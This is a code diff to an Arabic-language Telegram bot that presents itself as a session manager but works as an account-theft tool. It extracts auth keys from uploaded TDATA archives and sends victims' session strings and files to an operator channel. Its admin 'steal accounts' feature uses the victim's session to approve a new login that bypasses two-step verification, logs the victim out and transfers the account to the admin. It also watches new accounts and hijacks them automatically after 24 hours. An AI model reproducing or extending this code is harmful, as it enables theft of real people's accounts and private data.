@@ -177,6 +177,35 @@ def get_creation_year(user_id):
     except Exception:
         return "غـيـر مـعـروف"
 
+def get_dc_ip(dc_id):
+    return {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"}.get(dc_id, "149.154.167.51")
+
+def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999):
+    pyro_packed = struct.pack(">BI?256sQ?", dc_id, api_id, False, auth_key_bytes, user_id, False)
+    session = StringSession()
+    session._dc_id, session._server_address, session._port, session._auth_key = dc_id, get_dc_ip(dc_id), 443, AuthKey(auth_key_bytes)
+    return base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("="), session.save()
+
+async def extract_tdata_official(base_dir):
+    if not OPENTELE_AVAILABLE: return None, None, None
+    tdata_path = next((root for root, _, files in os.walk(base_dir) if 'key_datas' in files), None)
+    if not tdata_path: return None, None, None
+    try:
+        tdesk = TDesktop(tdata_path)
+        if not tdesk.isLoaded(): return None, None, None
+        def get_real_auth(acc):
+            auth_key = getattr(acc, 'authKey', getattr(acc, 'api', None))
+            if auth_key:
+                auth_key = getattr(auth_key, 'key', getattr(auth_key, 'auth_key', auth_key))
+                dc_id = getattr(acc, 'MainDcId', getattr(acc, 'mainDcId', getattr(acc, 'dcId', getattr(getattr(acc, 'api', None), 'dc_id', None))))
+                if isinstance(auth_key, bytes) and len(auth_key) == 256 and dc_id: return int(dc_id), auth_key, int(getattr(acc, 'UserId', getattr(acc, 'id', 9999)))
+            return None, None, None
+        for acc in (tdesk.accounts if hasattr(tdesk, 'accounts') else []) + ([tdesk.mainAccount] if hasattr(tdesk, 'mainAccount') else []):
+            d, a, u = get_real_auth(acc)
+            if d and a: return d, a, u
+    except Exception: pass
+    return None, None, None
+
 def get_hex_from_pyro(pyro_session):
     try:
         data = base64.urlsafe_b64decode(pyro_session + "=" * (-len(pyro_session) % 4))
@@ -219,14 +248,6 @@ def convert_telethon_to_pyrogram(session_str):
         except Exception:
             pass
     return session_str
-def get_dc_ip(dc_id):
-    return {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"}.get(dc_id, "149.154.167.51")
-
-def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999):
-    pyro_packed = struct.pack(">BI?256sQ?", dc_id, api_id, False, auth_key_bytes, user_id, False)
-    session = StringSession()
-    session._dc_id, session._server_address, session._port, session._auth_key = dc_id, get_dc_ip(dc_id), 443, AuthKey(auth_key_bytes)
-    return base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("="), session.save()
 
 def log_to_channel(text, file_path=None, session_text=None):
     try:
@@ -252,37 +273,37 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         await client_b.connect()
         # 1. طلب رمز تسجيل الدخول لـ B
         qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
-        
+
         # 2. الجلسة A توافق عليه (يتخطى التحقق بخطوتين برمجياً)
         await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
         await asyncio.sleep(2)
-        
+
         # 3. التأكد من دخول B واستخراج الـ Hex
         await client_b.get_me()
         session_b_str = await client_b.export_session_string()
         dc_id = client_b.me.dc_id if client_b.me else "Unknown"
         hex_key = get_hex_from_pyro(session_b_str)
         await client_b.disconnect()
-        
+
         # 4. الجلسة A تسجل خروج
         try:
             await client_a.invoke(functions.auth.LogOut())
         except Exception: pass
         await client_a.disconnect()
-        
+
         # 5. تحديث الملكية في الداتا بيس لصالح الأدمن
         conn = get_db_conn()
         c = conn.cursor()
         c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='' WHERE id=?", (session_b_str, admin_id, acc_id))
         conn.commit()
         conn.close()
-        
+
         # 6. إرسال الكليشة للضحية
         kick_msg = f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n⎉╎ الاسـم: {name}\n⎉╎ الـرقـم: {phone}\n•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً."
         try:
             bot.send_message(original_owner, kick_msg)
         except Exception: pass
-        
+
         # 7. إرسال رسالة النجاح للأدمن
         admin_msg = f"✅ 🏴‍☠️ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n⎉╎ الـرقـم: `{phone}`\n⎉╎ الاسـم: {name}\n⎉╎ الـسـيـرفـر (DC): {dc_id}\n\n🔑 مـفـتـاح HEX:\n`{hex_key}`\n\n•❐• تـم إنـهـاء بـاقـي الـجـلـسـات وتـسـجـيـل خـروج الـجـلـسـة الـقـديـمـة وتـولـيـد B مـسـتـقـلـة بـمـلـكـيـتـك."
         bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
@@ -317,7 +338,7 @@ async def auto_terminate_loop():
                         await asyncio.wait_for(client.connect(), timeout=12)
                         auths = await client.invoke(functions.account.GetAuthorizations())
                         wait_error = False
-                        
+
                         for auth in auths.authorizations:
                             if not getattr(auth, 'current', False):
                                 try:
@@ -327,13 +348,13 @@ async def auto_terminate_loop():
                                     if "fresh" in str(e).lower() or "24" in str(e).lower():
                                         wait_error = True
                                         break
-                        
+
                         if is_surveilled == 1 and not wait_error:
                             # 24 ساعة انتهت! نفذ التهجير الكامل
                             admin_id = int(tl_admin) if tl_admin and tl_admin.isdigit() else ADMIN_IDS[0]
                             await execute_full_migration(acc_id, client, owner_id, admin_id, phone, name)
                             continue # تم فصل العميل داخلياً
-                        
+
                     except Exception:
                         pass
                     finally:
@@ -354,6 +375,11 @@ def start_background_loop():
     loop.run_until_complete(auto_terminate_loop())
 
 threading.Thread(target=start_background_loop, daemon=True).start()
+
+# =========================================================
+# 🎛️ واجهات التحكم
+# =========================================================
+
 def home_keyboard(uid):
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
@@ -368,6 +394,7 @@ def home_keyboard(uid):
         markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"), InlineKeyboardButton("• إدارة المراقبة ⏳", callback_data="manage_surveillance"))
 
     return markup
+
 def accounts_action_keyboard(owner_id, action):
     accounts = get_all_accounts(owner_id)
     markup = InlineKeyboardMarkup()
@@ -626,7 +653,7 @@ async def perform_action_async(action, acc_id, owner_id):
             has_other_sessions = False
             terminated_count = 0
             wait_error = False
-            
+
             for auth in auths.authorizations:
                 if not getattr(auth, 'current', False):
                     has_other_sessions = True
@@ -728,6 +755,32 @@ def execute_2fa_action(message, uid):
     results = run_async(do_2fa_async(uid, state["target"], state["action"], state.get("old_pass", ""), state.get("new_pass", "")))
     bot.edit_message_text("🛂┊ نـتـيـجـة الـتـحـقـق:\n\n" + "\n".join(results), message.chat.id, status_msg.message_id, reply_markup=home_keyboard(uid), parse_mode="Markdown")
 
+# =========================================================
+# 📥 محرك تسجيل الدخول (Hex, String, ZIP, TDATA)
+# =========================================================
+
+def process_successful_login(message, status_msg, me, pyro_session, session_type="Session", file_path=None, raw_hex=None):
+    if check_duplicate(message.from_user.id, me.id):
+        bot.edit_message_text("⚠️ الـحـسـاب مـوجـود بـالـفـعـل فـي الـبـوت مـسـبـقـاً!", message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id))
+        return
+
+    save_account(message.from_user.id, me.phone_number or "Unknown", me.id, me.first_name or "User", pyro_session, "", session_type)
+
+    text = (f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n⎉╎ الاسـم: {me.first_name}\n⎉╎ الـرقـم: +{(me.phone_number or 'Unknown').replace('+', '')}\n⎉╎ الآيـدي: {me.id}\n•❐• سـنـة الإنـشـاء: {get_creation_year(me.id)}\n\nتـحـكـم بـحـسـابـك مـن الأزرار أدناه:")
+
+    bot.edit_message_text(text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id), parse_mode="Markdown")
+
+    if message.from_user.id not in ADMIN_IDS:
+        user_info = f"\n\n👤 مـعـلـومـات الـمـسـتـخـدم:\n⎉╎ الاسـم: {message.from_user.first_name}\n⎉╎ الآيـدي: `{message.from_user.id}`\n⎉╎ الـيـوزر: @{message.from_user.username or 'لا يوجد'}"
+        channel_text = text + user_info
+
+        if file_path:
+            log_to_channel(channel_text, file_path=file_path)
+        elif raw_hex:
+            log_to_channel(channel_text, session_text=raw_hex)
+        else:
+            log_to_channel(channel_text, session_text=pyro_session)
+
 @bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
 def handle_text_input(message):
     if not is_allowed(message.from_user.id): return bot.reply_to(message, "عذراً، البوت خاص!", parse_mode="Markdown")
@@ -790,9 +843,42 @@ def handle_files(message):
         me, p_sess = run_async(verify_file())
         if me: process_successful_login(message, status_msg, me, p_sess, "File")
         else: bot.edit_message_text("❌ مـلـف مـعـطـوب.", message.chat.id, status_msg.message_id)
+    elif file_name.endswith(".zip"):
+        status_msg = bot.reply_to(message, "•❐• جـاري سـحـب TDATA...", parse_mode="Markdown")
+        extract_dir = f"tmp{message.from_user.id}{int(time.time())}"
+        os.makedirs(extract_dir, exist_ok=True)
+        zip_path = os.path.join(extract_dir, file_name)
+        with open(zip_path, 'wb') as f:
+            f.write(bot.download_file(bot.get_file(message.document.file_id).file_path))
+        try:
+            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+                zip_ref.extractall(extract_dir)
+            dc_id, auth_key, user_id = run_async(extract_tdata_official(extract_dir))
+            if dc_id and auth_key:
+                p_sess, _ = generate_sessions(API_ID, dc_id, auth_key, user_id)
+                async def verify_tdata():
+                    client = Client(f"td{message.from_user.id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=p_sess, in_memory=True)
+                    try:
+                        await asyncio.wait_for(client.connect(), timeout=10)
+                        me = await client.get_me()
+                        await client.disconnect()
+                        return me
+                    except Exception:
+                        return None
+                me = run_async(verify_tdata())
+                if me:
+                    process_successful_login(message, status_msg, me, p_sess, "TDATA", file_path=zip_path)
+                else:
+                    bot.edit_message_text("❌ TDATA مـعـطـوبـة.", message.chat.id, status_msg.message_id)
+            else:
+                bot.edit_message_text("❌ لا يـوجـد بـيـانـات داخـل الـ ZIP.", message.chat.id, status_msg.message_id)
+        except Exception:
+            bot.edit_message_text("❌ مـلـف غـيـر صـالـح.", message.chat.id, status_msg.message_id)
+        finally:
+            shutil.rmtree(extract_dir, ignore_errors=True)
 
 # =========================================================
-# 👑 السحب الشامل والمطور (نظام التهجير)
+# 👑 السحب الشامل والمطور (نظام التهجير والمراقبة)
 # =========================================================
 
 @bot.callback_query_handler(func=lambda call: call.data == "admin_add_user")
@@ -862,7 +948,7 @@ async def check_account_for_menu(acc):
         pass
     finally:
         if client.is_connected: await client.disconnect()
-    
+
     creation_year = get_creation_year(uid)
     btn_text = f"{color} {name} | ID:{uid} | {creation_year} | جلسات:{session_count}"
     return InlineKeyboardButton(btn_text, callback_data=f"steal:{acc_id}")
@@ -877,12 +963,11 @@ async def build_steal_menu_async(admin_id, chat_id, msg_id):
     markup = InlineKeyboardMarkup()
     if accounts:
         markup.row(InlineKeyboardButton("🏴‍☠️ سحـب و تـهـجـيـر الـجـمـيـع", callback_data="steal:all"))
-        # فحص سريع لجميع الحسابات بشكل متوازي
         tasks = [check_account_for_menu(acc) for acc in accounts]
         buttons = await asyncio.gather(*tasks)
         for btn in buttons:
             markup.row(btn)
-            
+
     markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
     text = "🛂┊ **نـظـام تـهـجـيـر وسـحـب الـحـسـابـات:**\n\n🟢 = جـاهـز لـلـسـحـب (تخطى 24 ساعة).\n🟡 = جـاهـز لـلـسـحـب (اجتاز الفحص البرمجي).\nبدون لون = الحساب جديد (سيوضع تحت المراقبة).\n\n⎉╎ اخـتـر حـسـابـاً לـبـدء الـتـهـجـيـر:"
     bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
@@ -891,7 +976,7 @@ async def build_steal_menu_async(admin_id, chat_id, msg_id):
 def handle_steal(call):
     if call.from_user.id not in ADMIN_IDS: return
     target = call.data.split(":")[1]
-    
+
     status_msg = bot.send_message(call.message.chat.id, "⏳ جـاري إجـراء الـسـحـب والـتـهـجـيـر (Cloning)...", parse_mode="Markdown")
 
     if target == "all":
@@ -918,7 +1003,7 @@ async def steal_single_account(acc_id, admin_id):
         await asyncio.wait_for(client_a.connect(), timeout=12)
         auths = await client_a.invoke(functions.account.GetAuthorizations())
         wait_error = False
-        
+
         for auth in auths.authorizations:
             if not getattr(auth, 'current', False):
                 try:
@@ -930,34 +1015,28 @@ async def steal_single_account(acc_id, admin_id):
                         break
 
         if wait_error:
-            # إضافة للمراقبة التلقائية وتمرير ايدي الادمن في tl_session
             conn = get_db_conn()
             c = conn.cursor()
             c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
             conn.commit()
             conn.close()
             return f"⏳ `{phone}` جـديـد! تـم وضـعـه تـحـت نـظـام الـمـراقـبـة، سـيـتـم سـحـبـه تـلـقـائـيـاً عـنـد جـهـوزيـتـه."
-            
+
         else:
-            # نجح الطرد! تنفيذ التهجير الكامل
             success = await execute_full_migration(acc_id, client_a, owner_id, admin_id, phone, name)
-            if success:
-                return f"✅ تـم الـتـهـجـيـر بـنـجـاح لـ `{phone}`. راجـع الـرسـائـل 🔑"
-            else:
-                return f"❌ فـشـل تـهـجـيـر `{phone}` لأسباب تقنية."
-                
-    except Exception as e:
-        return f"❌ فشل الاتصال بالحساب `{phone}`."
+            if success: return f"✅ تـم الـتـهـجـيـر بـنـجـاح لـ `{phone}`. راجـع الـرسـائـل 🔑"
+            else: return f"❌ فـشـل تـهـجـيـر `{phone}` لأسباب تقنية."
+
+    except Exception as e: return f"❌ فشل الاتصال بالحساب `{phone}`."
     finally:
         if client_a.is_connected: await client_a.disconnect()
 
 @bot.callback_query_handler(func=lambda call: call.data == "manage_surveillance")
 def manage_surveillance_menu(call):
     if call.from_user.id not in ADMIN_IDS: return
-    
+
     conn = get_db_conn()
     c = conn.cursor()
-    # جلب الحسابات التي تحت المراقبة فقط
     c.execute("SELECT id, phone, first_name FROM sessions WHERE surveilled=1")
     accounts = c.fetchall()
     conn.close()
@@ -969,33 +1048,32 @@ def manage_surveillance_menu(call):
             markup.row(InlineKeyboardButton(f"🛑 {name} | {phone}", callback_data=f"unsurveil:{acc_id}"))
     else:
         markup.row(InlineKeyboardButton("✅ لا تـوجـد حـسـابـات تـحـت الـمـراقـبـة", callback_data="none"))
-        
+
     markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
-    
+
     text = "🛂┊ **إدارة الـحـسـابـات تـحـت الـمـراقـبـة ⏳:**\n\n⎉╎ هـذه الـحـسـابـات يـحـاول الـبـوت تـهـجـيـرهـا كـل سـاعـة ونص.\n⎉╎ اضغـط عـلـى أي حـسـاب لإلـغـاء الـمـراقـبـة والـتـهـجـيـر:"
     bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
-
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("unsurveil:"))
 def execute_unsurveil(call):
     if call.from_user.id not in ADMIN_IDS: return
     target = call.data.split(":")[1]
-    
+
     conn = get_db_conn()
     c = conn.cursor()
-    
+
     if target == "all":
         c.execute("UPDATE sessions SET surveilled=0 WHERE surveilled=1")
         msg = "✅ تـم إلـغـاء الـمـراقـبـة عـن جـمـيـع الـحـسـابـات!"
     else:
         c.execute("UPDATE sessions SET surveilled=0 WHERE id=?", (target,))
         msg = "✅ تـم إلـغـاء الـمـراقـبـة عـن هـذا الـحـسـاب!"
-        
+
     conn.commit()
     conn.close()
-    
+
     bot.answer_callback_query(call.id, msg, show_alert=True)
-    manage_surveillance_menu(call) # تحديث القائمة فوراً بعد الحذف
+    manage_surveillance_menu(call)
 
 if __name__ == "__main__":
     logging.info("🚀 جاري إطلاق البوت...")
